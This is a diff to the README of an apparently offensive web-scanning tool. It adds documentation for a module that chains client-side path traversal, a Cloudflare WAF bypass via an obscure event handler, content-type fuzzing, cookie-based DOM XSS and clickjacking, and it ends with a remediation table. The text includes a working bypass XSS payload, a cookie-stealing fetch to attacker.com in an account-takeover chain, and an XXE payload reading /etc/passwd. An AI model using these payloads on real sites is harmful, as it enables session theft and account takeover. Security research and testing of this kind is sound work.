@@ -1759,6 +1759,208 @@ npm audit fix --force
 
 ---
 
+### CSPT + Cloudflare WAF Bypass + Multi-ContentType Fuzzing — CSPTWafBypass (v2.1)
+
+> **Research basis:**  
+> Intigriti Bug Bytes #235 (April 2026)  
+> https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-235-april-2026  
+> Contributors: @xssdoctor (CSPT), @YourFinalSin (Cloudflare WAF bypass → ATO), @RenwaX23 (Cookie XSS)  
+> **Skill module:** `CSPTWafBypass` (id: 56)
+
+---
+
+#### Background: Four Emerging Attack Vectors Combined
+
+**Bug Bytes #235** aggregates four independently discovered attack techniques that together form
+a powerful attack chain targeting modern JavaScript-heavy applications:
+
+| # | Technique | Researcher | Impact |
+|---|-----------|------------|--------|
+| 1 | Client-Side Path Traversal (CSPT) | @xssdoctor | Unauthorized API access / IDOR |
+| 2 | Cloudflare WAF bypass via `oncontentvisibilityautostatechange` | @YourFinalSin | XSS → Full ATO |
+| 3 | Cookie injection → DOM XSS | @RenwaX23 | Session hijacking |
+| 4 | Auxclick (middle mouse) clickjacking | community | Clickjacking bypass |
+
+---
+
+#### Detection Category 1: Client-Side Path Traversal (CSPT)
+
+**What is CSPT?**  
+CSPT occurs when client-side JavaScript constructs API/resource URLs using user-controllable input
+(URL parameters, routing fragments, query strings) without path traversal validation.
+Unlike server-side path traversal, the **browser is the attacker's proxy** — the SPA's own routing
+framework resolves `../` sequences and passes the normalized path to backend API calls.
+
+**Affected frameworks (all major SPAs):**
+
+```javascript
+// React Router — router params in API fetch
+const { id } = useParams();
+fetch('/api/user/' + id + '/data');  // ← CSPT if id = "../../admin/users"
+
+// Next.js — router.query in API call
+const router = useRouter();
+fetch('/api/' + router.query.path + '/details');  // ← CSPT
+
+// Angular — ActivatedRoute in HttpClient
+this.route.params.subscribe(p =>
+  this.http.get('/api/' + p['id'] + '/resource').subscribe()  // ← CSPT
+);
+
+// Vue — $route.params in axios
+axios.get('/api' + this.$route.params.slug + '/data');  // ← CSPT
+```
+
+**Attack example:**
+
+```
+Legitimate URL: /app/user/profile/123
+CSPT payload:   /app/user/profile/123/../../admin/users
+JS fetch:       fetch('/api' + '/app/user/profile/123/../../admin/users/data')
+Resolved:       fetch('/api/admin/users/data')  ← UNAUTHORIZED
+```
+
+**bingo detection:**
+- Scans up to 10 JS bundles for 8 CSPT pattern signatures
+- Tests 21 traversal encodings (`../`, `%2f..%2f`, `%2e%2e/`, `%252e%252e/`, etc.)
+- Returns `VERIFIED` evidence when server responds HTTP 200 to traversal path
+- Auto-generates framework-specific curl PoC
+
+---
+
+#### Detection Category 2: Cloudflare WAF Bypass — `oncontentvisibilityautostatechange`
+
+**Discovery:** @YourFinalSin (April 2026, Bug Bytes #235)
+
+Cloudflare's WAF blocks well-known event handlers (`onclick`, `onload`, `onerror`, `onmouseover`…),
+but the **CSS Containment API's** `oncontentvisibilityautostatechange` attribute was not filtered
+as of April 2026.
+
+**Bypass payload:**
+```html
+<div oncontentvisibilityautostatechange=alert(document.domain) style=content-visibility:auto>
+```
+
+**Full Account Takeover chain:**
+```
+1. Find reflected XSS input point (blocked by Cloudflare WAF with classic payloads)
+2. Use bypass: <div oncontentvisibilityautostatechange=PAYLOAD style=content-visibility:auto>
+3. Cloudflare WAF passes the request → XSS fires in victim's browser
+4. Payload: fetch('https://attacker.com/steal?c='+document.cookie)
+         or: intercept OAuth authorization code from page URL/response
+5. Exchange stolen OAuth code for access token → Full Account Takeover
+```
+
+**bingo provides 7 bypass payloads** including:
+- `oncontentvisibilityautostatechange` (primary, CF WAF bypass)
+- `onanimationstart`, `ontransitionend` (CSS event handlers)
+- `onpointerdown`, `ondragstart` (Pointer/Drag API)
+- `onauxclick` (middle mouse — also for clickjacking)
+- mXSS via innerHTML comment parsing
+
+---
+
+#### Detection Category 3: Multi-Content-Type API Fuzzing
+
+Many API endpoints behave differently depending on the `Content-Type` header. WAF rules and
+input validation are often Content-Type–specific, creating blind spots:
+
+| Content-Type | Risk if Accepted |
+|---|---|
+| `text/xml` | XXE (XML External Entity injection) |
+| `application/x-www-form-urlencoded` | Bypasses JSON-specific WAF rules |
+| `application/graphql` | Hidden GraphQL endpoint |
+| `application/x-yaml` | YAML deserialization (Python/Ruby) |
+| `multipart/form-data` | File upload to non-upload endpoints |
+
+**bingo fuzzes 14 Content-Types** on discovered API endpoints and flags:
+- XML accepted → generates XXE PoC (`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`)
+- Form-urlencoded accepted → WAF bypass potential flag
+- Unexpected 200 on any non-JSON Content-Type → manual investigation recommended
+
+---
+
+#### Detection Category 4: Cookie Injection → DOM XSS
+
+**Researcher:** @RenwaX23
+
+When applications set cookie values based on user input **and** those cookies are later read
+into DOM sinks (`innerHTML`, `document.write`, `eval`), an attacker who can inject cookie values
+(via XSS, CRLF injection, or subdomain cookie setting) can achieve DOM XSS.
+
+**bingo detects:** `document.cookie` → `innerHTML`/`eval` data flow patterns in JS source.
+
+---
+
+#### Detection Category 5: Auxclick Clickjacking
+
+The `onauxclick` event fires on **middle mouse button** clicks — a vector that:
+- Is not blocked by `X-Frame-Options` (different execution context)
+- Works even when classic clickjacking defenses are present
+- Can trigger sensitive actions (password reset, OAuth authorization, payments)
+
+**bingo checks** for missing `X-Frame-Options` and `CSP frame-ancestors`, and generates
+both classic and auxclick-specific PoC payloads.
+
+---
+
+#### AI Auto-Trigger Logic
+
+```python
+# Activation conditions (all web targets):
+triggers = {
+    "spa_framework": "React/Angular/Vue/Next.js detected in JS bundles",
+    "cloudflare":    "cf-ray / cf-cache-status header present",
+    "oauth":         "OAuth/SSO endpoints (/auth, /oauth, client_id=) found",
+    "default":       "Activated on all web targets (universal)",
+}
+```
+
+---
+
+#### Output Example
+
+```
+🌐 AI decision: CSPT+CloudflareWAF bypass+MultiContentType scan activated
+☁ Cloudflare WAF detected: https://target.com — oncontentvisibilityautostatechange bypass ready
+🖥 SPA framework detected: react — running CSPT path traversal tests...
+🔴 CSPT pattern: fetch_location in /static/js/main.js — location.pathname → API call [LIKELY]
+🔴 CF WAF bypass: oncontentvisibilityautostatechange — CF WAF bypassed → XSS → OAuth ATO [LIKELY]
+🔴 OAuth ATO chain: CF bypass XSS → OAuth code theft → Full ATO [LIKELY]
+🟡 ContentType fuzzing: /api/v1/data — text/xml accepted (XXE possible) [LIKELY]
+🟡 Cookie injection → DOM XSS: document.cookie → innerHTML sink [LIKELY]
+🟡 Auxclick clickjacking: no X-Frame-Options detected [VERIFIED]
+🧩 CSPTWafBypass: 6 findings | CF:True | SPA:react | CSPT_patterns:1 | CF_bypass:7 | sev:high
+```
+
+---
+
+#### Evidence Levels
+
+| Finding Type | Evidence Level | Condition |
+|---|---|---|
+| CSPT endpoint 200 response | `VERIFIED` | Server returned 200 on traversal URL |
+| CSPT JS pattern | `LIKELY` | Pattern found in JS bundle code |
+| CF WAF bypass payload | `LIKELY` | Cloudflare headers detected |
+| OAuth ATO chain | `LIKELY` | CF + OAuth both detected |
+| Content-Type XXE | `LIKELY` | XML accepted, baseline rejected |
+| Cookie XSS / Auxclick | `INFERRED` | DOM sink pattern or header absence |
+
+---
+
+#### Quick Remediation
+
+| Finding | Priority | Fix |
+|---|---|---|
+| CSPT | CRITICAL | Sanitize `location.pathname`/router params before API calls; server-side path whitelist |
+| CF WAF bypass | HIGH | Add custom CF rule for `oncontentvisibilityautostatechange`; enforce strict CSP |
+| OAuth ATO chain | CRITICAL | PKCE mandatory; strict `redirect_uri`; revoke all tokens immediately |
+| XML Content-Type XXE | HIGH | Whitelist `application/json` only; disable DOCTYPE in XML parsers |
+| Cookie XSS | HIGH | `HttpOnly` on all cookies; use `textContent` not `innerHTML` |
+| Auxclick clickjacking | MEDIUM | `X-Frame-Options: DENY` + `CSP: frame-ancestors 'none'` |
+
+---
+
 ## Changelog
 
 ### v2.1.0 — Official Release *(2026-06)*
@@ -1768,7 +1970,7 @@ npm audit fix --force
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **55 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55)
+- **56 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55), CSPTWafBypass (#56)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
